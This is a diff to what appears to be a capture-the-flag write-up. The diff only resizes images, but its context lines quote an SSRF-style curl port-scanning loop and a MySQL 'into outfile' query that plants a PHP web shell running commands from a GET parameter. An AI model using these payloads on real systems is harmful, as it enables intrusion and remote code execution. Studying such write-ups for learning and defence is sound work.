@@ -66,7 +66,7 @@ for port in {21,25,80,8080,9000,3306,5422}; do echo $port; curl -s "http://10.10
  * Let's try to use our script by sending a query to the MySQL version.
 
 <p align="center">
-   <img width="700" height="100" src="./img/8.png">
+   <img width="900" height="140" src="./img/8.png">
  </p>
 
 > [!IMPORTANT]  
@@ -110,7 +110,7 @@ select "<?php system($_GET[1337]);?>" into outfile "/var/www/html/oi.php";
 * By accessing our created file oi.php, we can execute it remotely within the web server.
 
 <p align="center">
-   <img width="500" height="100" src="./img/13.png">
+   <img width="430" height="100" src="./img/13.png">
 </p>
 
 * knowing that it is a PHP server, we can create the reverse with the payload;
